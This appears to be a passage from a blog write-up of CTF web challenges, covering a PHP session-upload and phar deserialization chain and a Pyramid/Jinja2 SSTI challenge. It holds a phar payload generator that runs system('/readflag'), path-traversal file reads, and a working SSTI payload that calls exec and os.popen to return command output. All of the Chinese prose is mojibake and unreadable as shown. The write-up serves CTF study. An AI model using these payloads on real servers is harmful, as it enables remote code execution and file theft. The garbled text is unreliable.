<li><p>åˆ†æè¿˜æ˜¯å¾ˆæ­£å¸¸çš„ï¼Œä½†æ˜¯è¿™é‡Œçš„wafæ˜¯æŠŠå¤–éƒ¨çš„è¾“å…¥éƒ½banæ‰äº†ï¼Œè¿™é‡Œéœ€è¦æ‰¾åˆ°ä¸€ä¸ªå†…éƒ¨å¯æ§çš„æ–‡ä»¶æ¥åˆ©ç”¨</p>
</li>
<li><p>å¯æ§æ–‡ä»¶æœ‰æ—¥å¿—æ–‡ä»¶ï¼Œsessionæ–‡ä»¶</p>
<ol>
<li>phpç‰ˆæœ¬ä¸º7.2,è¿™ä¸ªç‰ˆæœ¬å°±ç®—ä¸å¼€å¯sessionï¼Œåªè¦ä¸Šä¼ äº†æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨cookieä¼ å…¥äº†PHPSESSIDï¼Œä¹Ÿä¼šç”Ÿæˆä¸´æ—¶çš„sessionæ–‡ä»¶</li>
<li>è¿™é‡Œæ²¡æœ‰banæ‰..&#x2F;ä½†&#x2F;etc&#x2F;passwdæ²¡æ³•è¯»ï¼Œ<strong>æ€€ç–‘æ˜¯è®¾ç½®äº†open_basedir</strong>ï¼Œæ‰€ä»¥åªæœ‰sessionæ–‡ä»¶äº†(<strong>åœ¨&#x2F;tmpä¸‹ç”Ÿæˆéƒ¨åˆ†å†…å®¹å¯æ§çš„<code>sess_&lt;sessionid&gt;</code>æ–‡ä»¶</strong>)</li>
<li>æ€»ä½“æ­¥éª¤ï¼šä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶åœ¨sessionä¸´æ—¶æ–‡ä»¶ä¸­å†™å…¥ç¼–ç åçš„pharæ–‡ä»¶ï¼Œç„¶åç”¨filterä¼ªåè®®å°†pharæ–‡ä»¶è¿˜åŸå†™åˆ°&#x2F;tmp&#x2F;tmp.tmpä¸­ï¼Œæœ€åç”¨pharä¼ªåè®®è§£æ</li>
</ol>
</li>
<li><p>è§£å†³é—®é¢˜1ï¼šå†™å…¥pharæ–‡ä»¶: SV</p>
<ol>
<li><p>å˜æ¢ä¸ºbase64ç¼–ç ï¼Œç„¶åè¯»å–çš„æ—¶å€™å¯ä»¥ç›´æ¥ç”¨ä¼ªåè®®å°±ok</p>
</li>
<li><p>è¿™é‡Œçš„æ€æƒ³å°±æ˜¯ç¼–ç ï¼Œå› ä¸ºæœ‰ä¸€äº›äºŒè¿›åˆ¶å­—ç¬¦æ— æ³•(utf-8)ç›´æ¥ä¼ è¾“ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥æ˜¯</p>
  <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.utf-8.utf-16be å’Œ convert.iconv.utf-16be.utf-8</span><br><span class="line">convert.quoted-printable-encode å’Œ convert.quoted-printable-decode</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>è§£å†³é—®é¢˜2ï¼šç”Ÿæˆpharæ–‡ä»¶: SV</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">Admin</span>();</span><br><span class="line"><span class="variable">$o</span> -&gt;code=<span class="string">&quot;system(&#x27;/readflag&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// bash: cat test.phar | base64 -w0 | python3 -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span></span><br><span class="line"><span class="comment">// ä¹Ÿå¯ä»¥ç›´æ¥ç”¨pythonè„šæœ¬</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>è§£å†³é—®é¢˜3ï¼šsessionä¸´æ—¶æ–‡ä»¶çš„åˆ©ç”¨: SV</p>
<ol>
<li>è¿™é‡Œçš„æœ¬æ„æ˜¯è¦æŠŠpharå†…å®¹å†™å…¥sessionä¸´æ—¶æ–‡ä»¶ï¼Œä½†æ˜¯sessionæ–‡ä»¶å‰åæœ‰æ•°æ®ï¼Œéœ€è¦å»é™¤ï¼Œ<strong>åˆ©ç”¨phpçš„base64è§£ç ç‰¹æ€§</strong>: åˆæ³•å­—ç¬¦åªæœ‰<code>A-Za-z0-9\/\=\+</code>ï¼Œå…¶ä»–å­—ç¬¦ä¼šè‡ªåŠ¨è¢«å¿½ç•¥ï¼Œå¦‚ä½•å»é™¤ï¼Œå¯ä»¥è€ƒè™‘å¤šæ¬¡base64è§£ç (é€‚ç”¨php:&#x2F;&#x2F;filteræ¥å®ç°)<ol>
<li><img src="/pic/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/n0ob_un4er_sess.png" alt="pic"></li>
<li>éœ€è¦äº†è§£base64çš„ç¼–ç è§„åˆ™<ol>
<li>ç¼–ç ï¼šæ¯3ä¸ªå­—èŠ‚(ä¸‰ä¸ªå­—ç¬¦24bits)æ˜ å°„ä¸º4(6bits&#x2F;char)ä¸ªå­—ç¬¦<ol>
<li>å¦‚æœåªæœ‰ä¸€ä¸ªå­—èŠ‚: è¡¥ä¸Š4ä¸ª0åŠ ä¸Šä¸¤ä¸ª&#x3D;</li>
<li>å¦‚æœæ˜¯ä¸¤å­—èŠ‚: è¡¥ä¸Š2ä¸ª0åŠ ä¸Šä¸€ä¸ª&#x3D;</li>
<li>è¿™é‡Œè¡¥ä¸Šçš„0å¹¶ä¸å½±å“è§£ç ï¼Œåªæ˜¯ä¸ºäº†ä¿è¯ç¼–ç çš„å­—ç¬¦æ•°æ˜¯6çš„å€æ•°</li>
</ol>
</li>
<li>è§£ç : å…ˆå–å‡ºå°¾éƒ¨çš„&#x3D;ï¼Œæ¯4ä¸ªå­—ç¬¦(6bits&#x2F;char)æ˜ å°„ä¸º3ä¸ª(8bits&#x2F;char)</li>
<li><strong>è§£ç ä¸­é—´ä¸èƒ½å‡ºç°&#x3D;å·</strong></li>
</ol>
</li>
<li>ç°åœ¨è¦æ¸…é™¤æ•°æ®<ol>
<li>å…ˆæ˜ç¡®ä¸€ä¸‹ç›®æ ‡<ol>
<li>ä½¿å¾—å˜ä¸ºéæ³•å­—ç¬¦ï¼Œç„¶åå†æ¬¡(å¯ä»¥æ˜¯næ¬¡)base64è§£ç ï¼Œä½¿å¾—ä»–ä»¬æ¶ˆå¤±</li>
</ol>
</li>
<li>å»é™¤<code>upload_progress_</code>å‰ç¼€ï¼Œ</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="ez-galllery"><a href="#ez-galllery" class="headerlink" title="ez_galllery"></a>ez_galllery</h2><h3 id="ez-galllery-env"><a href="#ez-galllery-env" class="headerlink" title="ez_galllery env"></a>ez_galllery env</h3><ol>
<li><code>docker run --name ez_gallery -d -p 5000:6543 sketchpl4ne/gcb2024:ez_gallery_img</code></li>
</ol>
<h3 id="ez-galllery-åˆ†æ"><a href="#ez-galllery-åˆ†æ" class="headerlink" title="ez_galllery åˆ†æ"></a>ez_galllery åˆ†æ</h3><ol>
<li><p>æ ‡å¤´çœ‹å‡ºæ˜¯pythonæ¡†æ¶</p>
</li>
<li><p>æ²¡æœ‰å…¶ä»–ä¿¡æ¯ï¼Œå¼±å¯†ç admin:123456</p>
<ol>
<li><p>æ‰«ç›®å½•</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[15:47:12] 403 -    12B - /home</span><br><span class="line">[15:47:13] 403 -    12B - /info</span><br><span class="line">[15:47:14] 200 -    5KB - /login</span><br><span class="line">[15:47:18] 403 -    12B - /shell</span><br></pre></td></tr></table></figure>
</li>
<li><p>shellå¯è®¿é—®ï¼Ÿå…ˆè¯»ä¸ªæ–‡ä»¶</p>
<ol>
<li><code>/info?file=/proc/self/cmdline</code>: python3 app.py</li>
<li>ç½®ç©ºæŠ¥é”™è¿›debugï¼Ÿä¼¼ä¹ä¸è¡Œï¼Œæœ‰å¯¹é”™è¯¯è¿›è¡Œå¤„ç†</li>
<li>çœ‹app.py: <code>/info?file=../../app.py</code><ol>
<li>æœ‰æ²¡è§è¿‡çš„ä¸œè¥¿: pyramidï¼Œæ˜¯å•¥</li>
</ol>
</li>
</ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jinja2</span><br><span class="line"><span class="keyword">from</span> pyramid.config <span class="keyword">import</span> Configurator</span><br><span class="line"><span class="keyword">from</span> pyramid.httpexceptions <span class="keyword">import</span> HTTPFound</span><br><span class="line"><span class="keyword">from</span> pyramid.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> pyramid.session <span class="keyword">import</span> SignedCookieSessionFactory</span><br><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"><span class="keyword">from</span> Captcha <span class="keyword">import</span> captcha_image_view, captcha_store</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line"></span><br><span class="line">users = &#123;<span class="string">&quot;admin&quot;</span>: User(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123456&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">root_view</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># é‡å®šå‘åˆ° /login</span></span><br><span class="line">    <span class="keyword">return</span> HTTPFound(location=<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info_view</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># æŸ¥çœ‹ç»†èŠ‚å†…å®¹</span></span><br><span class="line">    <span class="keyword">if</span> request.session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;è¯·å…ˆç™»å½•&quot;</span>, status=<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    file_name = request.params.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="comment"># æ–‡ä»¶åå’Œåç¼€åˆ†å¼€</span></span><br><span class="line">    file_base, file_extension = os.path.splitext(file_name)</span><br><span class="line">    <span class="keyword">if</span> file_name:</span><br><span class="line">        <span class="comment"># æœ‰ä¸€ä¸ªæ–°ç›®å½•</span></span><br><span class="line">        file_path = os.path.join(<span class="string">&#x27;/app/static/details/&#x27;</span>, file_name)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line">                <span class="built_in">print</span>(content)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            content = <span class="string">&quot;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        content = <span class="string">&quot;æœªæä¾›æ–‡ä»¶åã€‚&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;file_name&#x27;</span>: file_name, <span class="string">&#x27;content&#x27;</span>: content, <span class="string">&#x27;file_base&#x27;</span>: file_base&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home_view</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># ä¸»è·¯ç”±</span></span><br><span class="line">    <span class="keyword">if</span> request.session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;è¯·å…ˆç™»å½•&quot;</span>, status=<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    detailtxt = os.listdir(<span class="string">&#x27;/app/static/details/&#x27;</span>)  <span class="comment"># å¯åˆ—ç›®å½•</span></span><br><span class="line">    picture_list = [i[:i.index(<span class="string">&#x27;.&#x27;</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> detailtxt]</span><br><span class="line">    file_contents = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> picture <span class="keyword">in</span> picture_list:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;/app/static/details/<span class="subst">&#123;picture&#125;</span>.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            file_contents[picture] = f.read(<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;picture_list&#x27;</span>: picture_list, <span class="string">&#x27;file_contents&#x27;</span>: file_contents&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_view</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.POST.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.POST.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        user_captcha = request.POST.get(<span class="string">&#x27;captcha&#x27;</span>, <span class="string">&#x27;&#x27;</span>).upper()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> user_captcha != captcha_store.get(<span class="string">&#x27;captcha_text&#x27;</span>, <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> Response(<span class="string">&quot;éªŒè¯ç é”™è¯¯ï¼Œè¯·é‡è¯•ã€‚&quot;</span>)</span><br><span class="line">        user = users.get(username)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> user.password == password:</span><br><span class="line">            request.session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> Response(<span class="string">&quot;ç™»å½•æˆåŠŸï¼&amp;amp;lt;a href=&#x27;/home&#x27;&amp;amp;gt;ç‚¹å‡»è¿›å…¥ä¸»é¡µ&amp;amp;lt;/a&amp;amp;gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Response(<span class="string">&quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ã€‚&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell_view</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;è¯·å…ˆç™»å½•&quot;</span>, status=<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ‰“ssti</span></span><br><span class="line">    expression = request.GET.get(<span class="string">&#x27;shellcmd&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># è¿‡æ»¤length, count, ., æ•°å­—, %</span></span><br><span class="line">    blacklist_patterns = [<span class="string">r&#x27;.*length.*&#x27;</span>,<span class="string">r&#x27;.*count.*&#x27;</span>,<span class="string">r&#x27;.*[0-9].*&#x27;</span>,<span class="string">r&#x27;.*\..*&#x27;</span>,<span class="string">r&#x27;.*soft.*&#x27;</span>,<span class="string">r&#x27;.*%.*&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(re.search(pattern, expression) <span class="keyword">for</span> pattern <span class="keyword">in</span> blacklist_patterns):</span><br><span class="line">        <span class="comment"># ä¹Ÿæ²¡æœ‰æŠ¥é”™é˜¿è€å¼Ÿ</span></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&#x27;wafwafwaf&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = jinja2.Environment(loader=jinja2.BaseLoader()).from_string(expression).render(&#123;<span class="string">&quot;request&quot;</span>: request&#125;)</span><br><span class="line">        <span class="keyword">if</span> result != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> Response(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> Response(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    session_factory = SignedCookieSessionFactory(<span class="string">&#x27;secret_key&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> Configurator(session_factory=session_factory) <span class="keyword">as</span> config:</span><br><span class="line">        config.include(<span class="string">&#x27;pyramid_chameleon&#x27;</span>)  <span class="comment"># æ·»åŠ æ¸²æŸ“æ¨¡æ¿</span></span><br><span class="line">        config.add_static_view(name=<span class="string">&#x27;static&#x27;</span>, path=<span class="string">&#x27;/app/static&#x27;</span>)</span><br><span class="line">        config.set_default_permission(<span class="string">&#x27;view&#x27;</span>)  <span class="comment"># è®¾ç½®é»˜è®¤æƒé™ä¸ºview</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ³¨å†Œè·¯ç”±</span></span><br><span class="line">        config.add_route(<span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        config.add_route(<span class="string">&#x27;captcha&#x27;</span>, <span class="string">&#x27;/captcha&#x27;</span>)</span><br><span class="line">        config.add_route(<span class="string">&#x27;home&#x27;</span>, <span class="string">&#x27;/home&#x27;</span>)</span><br><span class="line">        config.add_route(<span class="string">&#x27;info&#x27;</span>, <span class="string">&#x27;/info&#x27;</span>)</span><br><span class="line">        config.add_route(<span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">        config.add_route(<span class="string">&#x27;shell&#x27;</span>, <span class="string">&#x27;/shell&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ³¨å†Œè§†å›¾</span></span><br><span class="line">        config.add_view(root_view, route_name=<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">        config.add_view(captcha_image_view, route_name=<span class="string">&#x27;captcha&#x27;</span>)</span><br><span class="line">        config.add_view(home_view, route_name=<span class="string">&#x27;home&#x27;</span>, renderer=<span class="string">&#x27;/app/templates/home.pt&#x27;</span>, permission=<span class="string">&#x27;view&#x27;</span>)</span><br><span class="line">        config.add_view(info_view, route_name=<span class="string">&#x27;info&#x27;</span>, renderer=<span class="string">&#x27;/app/templates/details.pt&#x27;</span>, permission=<span class="string">&#x27;view&#x27;</span>)</span><br><span class="line">        config.add_view(login_view, route_name=<span class="string">&#x27;login&#x27;</span>, renderer=<span class="string">&#x27;/app/templates/login.pt&#x27;</span>)</span><br><span class="line">        config.add_view(shell_view, route_name=<span class="string">&#x27;shell&#x27;</span>, renderer=<span class="string">&#x27;string&#x27;</span>, permission=<span class="string">&#x27;view&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        config.scan()</span><br><span class="line">        app = config.make_wsgi_app()</span><br><span class="line">        <span class="keyword">return</span> app</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = main()</span><br><span class="line">    server = make_server(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">6543</span>, app)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>æ€è·¯å…¶å®å¾ˆå¤šçš„</p>
<ol>
<li>é’©å­å›æ˜¾: å®˜æ–¹é¢˜è§£: flag{jasper_wanna_two_girlfriend}: <code>&quot;shellcmd&quot;: &quot;&#123;&#123;cycler['__init__']['__globals__']['__builtins__']['exec'](\"getattr(request,'add_response_callback')(lambda request,response:setattr(response, 'text', getattr(getattr(__import__('os'),'popen')('/readflag'),'read')()))\",&#123;'request': request&#125;)&#125;&#125;&quot;</code></li>
<li>å¸¦å¤–(banäº†.å’Œæ•°å­—éš¾ç»•è¿‡)</li>
<li>å†™å…¥æ–‡ä»¶å›æ˜¾: -rwxr-xr-x 1 root root 4659 Dec 13 21:54 &#x2F;app&#x2F;app.py app.pyæ²¡æœ‰æƒé™</li>
<li>ç›²æ³¨æ¥è·å–ä¿¡æ¯: bashæ—¶é—´ç›²æ³¨: [<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/16077]%EF%BC%8C%E4%B8%8D%E8%BF%87%E8%BF%99%E9%87%8C%E6%9C%89%E4%B8%AA%E7%99%BB%E5%BD%95%E9%97%AE%E9%A2%98%EF%BC%8C%E6%97%B6%E9%97%B4%E4%B8%8A%E6%9C%89%E7%82%B9%E9%9A%BE%E5%B4%A9">https://xz.aliyun.com/news/16077]ï¼Œä¸è¿‡è¿™é‡Œæœ‰ä¸ªç™»å½•é—®é¢˜ï¼Œæ—¶é—´ä¸Šæœ‰ç‚¹éš¾å´©</a></li>
</ol>
</li>
</ol>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ol>
<li>Mountain<ul>
<li><input disabled="" type="checkbox"> è¯†åˆ«ä¸åŒæ¡†æ¶ç‰¹å¾</li>
<li><input disabled="" type="checkbox"> ååºåˆ—åŒ–æ•°æ®æ ¼å¼è¾¨åˆ«(base64)</li>
</ul>
<ol>
<li>å¤šå¤šè§‚å¯Ÿï¼Œè¿”å›åŒ…ï¼Œsessionç­‰ç­‰ï¼Œæ”»å‡»ç‚¹æ³›åŒ–</li>
</ol>
</li>
<li>signal<ul>
<li><input disabled="" type="checkbox"> å¤‡ä»½æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²è¡¥å……</li>
<li><input disabled="" type="checkbox"> filter-chainï¼Œrceå’Œè¯»æ–‡ä»¶å†ç†Ÿæ‚‰ä¸€ä¸‹</li>
<li><input disabled="" type="checkbox"> äºŒæ¬¡ç¼–ç åŸç†</li>
<li><input disabled="" type="checkbox"> ssrfå…¨é¢ä¸€äº›</li>
</ul>
<ol>
<li>è¿˜æ˜¯ä¸èƒ½å¤ªä¾èµ–dirsearch 555</li>
</ol>
</li>
<li>å›¾ç‰‡æŸ¥çœ‹å™¨<ul>
<li><input disabled="" type="checkbox"> filter-chainï¼Œrceå’Œè¯»æ–‡ä»¶å†ç†Ÿæ‚‰ä¸€ä¸‹</li>
<li><input disabled="" type="checkbox"> pharååºåˆ—åŒ–çš„ç»†èŠ‚å’Œç»•è¿‡</li>
<li><input disabled="" type="checkbox"> php:&#x2F;&#x2F;filter</li>
<li><input disabled="" type="checkbox"> åˆç†æ¨æµ‹åå°æ£€æµ‹æ–¹å¼å’Œå‡½æ•°</li>
</ul>
</li>
<li>n0ob_un4er<ol>
<li>ä¸æ„§æ˜¯å°‘è§£é¢˜ç›®</li>
</ol>
<ul>
<li><input checked="" disabled="" type="checkbox"> è¾“å…¥æºå¯ä»¥ä»ä¸´æ—¶æ–‡ä»¶ï¼Œä»å…·ä½“çš„phpç‰ˆæœ¬ä¸‹sessionçš„å­˜å‚¨å…¥æ‰‹(ä¸è¦ä¾é åˆ»æ¿å°è±¡): ä¸å¼€å¯sessionä¼šåœ¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™ç”Ÿæˆsessionä¸´æ—¶æ–‡ä»¶ï¼Œæœç´¢: php session file<ol>
<li>å…¶å®æ˜¯session.upload_progressè¿™ä¸ªä¸œè¥¿çš„ç¼˜æ•…<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2035863">source</a></li>
</ol>
</li>
<li><input disabled="" type="checkbox"> php sessionæœºåˆ¶çš„è®¤è¯†</li>
</ul>
</li>
<li>ez_gallery<ul>
<li><input disabled="" type="checkbox"> å¼±å¯†ç ç§¯ç´¯ä¸€ä¸‹</li>
<li><input disabled="" type="checkbox"> pipx+fenjing</li>
</ul>
</li>
</ol>
<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol>
<li>[<a target="_blank" rel="noopener" href="https://eddiemurphy89.github.io/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/]">https://eddiemurphy89.github.io/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/]</a></li>
